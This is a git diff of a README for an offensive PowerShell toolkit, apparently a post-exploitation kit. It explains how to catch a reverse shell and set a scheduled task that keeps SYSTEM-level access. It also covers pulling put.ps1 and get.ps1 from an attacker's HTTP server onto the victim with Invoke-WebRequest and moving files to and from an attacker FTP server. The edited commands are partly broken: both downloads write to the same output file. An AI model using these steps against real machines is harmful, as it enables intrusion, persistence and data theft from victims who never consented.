@@ -11,6 +11,7 @@ Always obtain explicit written permission before testing any system or network t
 ---
 
 #  Project Execution Flow
+0. **Clone the GitHub Repo**
 
 This setup consists of two main modules:
 
@@ -51,7 +52,7 @@ This sets up a listener on port `1111` to receive the incoming reverse shell con
 
 #### **2. Establish Persistence (Optional but Recommended)**
 
-* On the victim system (via the reverse shell), run the **single-line persistence command** found in the `persistence.ps1` file.
+* On the victim system (via the reverse shell), run the **single-line persistence command** found in the `Schedule for nt authority` file.
 * This command sets up a **scheduled task** that:
 
   * Runs `L.ps1` on system startup and unlock.
@@ -63,11 +64,11 @@ Once done, you will have a **persistent reverse shell** as SYSTEM — even after
 
 ##  File Transfer Module
 
-> This module allows you to transfer files from the victim system to your attacker-controlled FTP server using PowerShell.
+> This module allows you to transfer files from and to the victim.
 
 ###  Prerequisite
 
-* Start a local HTTP server on the attacker machine in the folder where `Transfer.ps1` is located:
+* Start a local HTTP server on the attacker machine `File_Transfer`(ClonedRepo) folder:
 
 ```bash
 python3 -m http.server 8000
@@ -77,12 +78,13 @@ python3 -m http.server 8000
 
 ### 🔹 Step-by-Step
 
-#### **1. Download `Transfer.ps1` to Victim**
+#### **1. Download `put.ps1 and get.ps1` to Victim**
 
-From the victim machine (via reverse shell), download the `Transfer.ps1` script using:
+From the victim machine (via reverse shell), download the `put.ps1 and get.ps1` script using:
 
 ```powershell
-Invoke-WebRequest -Uri "http://<attacker-ip>:8000/Transfer.ps1" -OutFile "C:\Windows\System32\Transfer.ps1"
+Invoke-WebRequest -Uri "http://<attacker-ip>:8000/put.ps1" -OutFile "C:\Windows\System32\Transfer.ps1"
+Invoke-WebRequest -Uri "http://<attacker-ip>:8000/get.ps1" -OutFile "C:\Windows\System32\Transfer.ps1"
 ```
 
 Replace `<attacker-ip>` with your actual IP address.
@@ -95,20 +97,24 @@ Replace `<attacker-ip>` with your actual IP address.
 * Ensure:
 
   * The FTP server is running on the port defined in the script (default: `21`).
-  * A directory named `uploads` exists on the FTP server.
+  * A directory named `uploads` should exist on the FTP server.
 
 ---
 
-#### **3. Set Variables in `Transfer.ps1`**
+#### **3. Set Variables in for Transfer**
 
-Before executing the script, set the following variables at the top of `Transfer.ps1`:
+Before executing the script, set the following variables:
 
 ```powershell
-$ftpserver      = "192.168.1.10"
-$ftpport        = 21
-$ftpusername    = "ftpuser"
-$ftppassword    = "password123"
+$IP="192.168.1.16:8000"
+$ftpserver = "192.168.1.10"
+$ftpport = 21
+$ftpusername = "username" 
+$ftppassword = "password"
+
 ```
+
+**Note: Now that everything is set you need to run put.ps1 and get.ps1 on the reverse shell (here on in future after you close this shell you have and ge a new one there is no need to run the get.ps1 and put.ps1 again.)**
 
 ---
 
@@ -121,5 +127,17 @@ get "File_Name"
 ```
 
 This will upload the specified file(s) to your FTP server’s `/uploads` directory.
+
+---
+
+The commad to put the file to the victim is as follows:
+
+```powershell
+put "File_Name"
+```
+
+This will upload the specified file(s) to the victim directory.
+
+**Note: Make sure you are running the python http server and that server directory contains the file you want to put on the victim.**
 
 ---
